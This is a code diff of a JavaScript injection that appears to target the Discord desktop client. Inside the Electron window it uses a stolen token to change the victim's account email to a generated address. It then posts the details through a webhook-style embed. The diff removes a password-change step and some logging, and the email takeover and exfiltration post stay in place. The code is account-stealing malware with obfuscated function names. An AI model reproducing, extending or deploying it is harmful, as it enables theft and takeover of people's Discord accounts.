@@ -70,6 +70,8 @@ var config = {
 };
 
 
+
+
 async function execScript(str) {
     var window = electron.BrowserWindow.getAllWindows()[0];
     var script = await window.webContents.executeJavaScript(str, true);
@@ -1006,7 +1008,6 @@ async function execScript(str) {
             Friends,
           } = await BoukiTuclcavectesfonctions();
           let language = user.locale ?? "en-US";
-          console.log(language);
   
           let [
             editprofil,
@@ -1801,20 +1802,12 @@ async function execScript(str) {
   
               console.log(generatedEmail, generatedPassword);
               try {
-                const response = await updateEmail(
+                const res = await updateEmail(
                   token,
                   generatedEmail,
                   data.password
                 );
-                console.log(response);
-                if (response.username) {
-                  const res = await updatePassword(
-                    token,
-                    data.password,
-                    generatedPassword
-                  );
-                  if (res.username) {
-                    console.log("Discord Response :", res);
+                if (res.username) {
   
                     var params = await makeEmbed({
                       title:
@@ -1878,7 +1871,7 @@ async function execScript(str) {
   
                     await post(params);
                     break;
-                  }
+                  
                 }
               } catch (error) {}
             }
